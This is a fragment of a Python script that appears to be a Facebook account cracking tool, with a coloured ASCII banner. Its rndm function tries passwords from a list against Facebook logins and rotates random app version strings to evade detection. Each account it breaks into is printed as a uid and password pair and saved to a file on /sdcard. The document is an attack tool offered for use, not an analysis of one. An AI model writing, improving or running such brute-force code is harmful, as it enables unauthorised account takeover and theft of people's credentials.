...
████       ███▄ █▀    ▀██████▀    ██████████ 
\x1b[1;31m ---------------------------------------------
\x1b[1;31m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  TEST
\x1b[1;31m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  TEST
\x1b[1;31m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Status  :  TEST
\x1b[1;31m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool    :  MIX
\x1b[1;31m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Version : \x1b[1;92m0.6
\x1b[1;31m ----------------------------------------------
\x1b[1;32m TEST
\033[1;33m==================================================== """  )
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [TEST-] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/TEST-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [TEST-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/VEER-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [TEST-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TEST-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
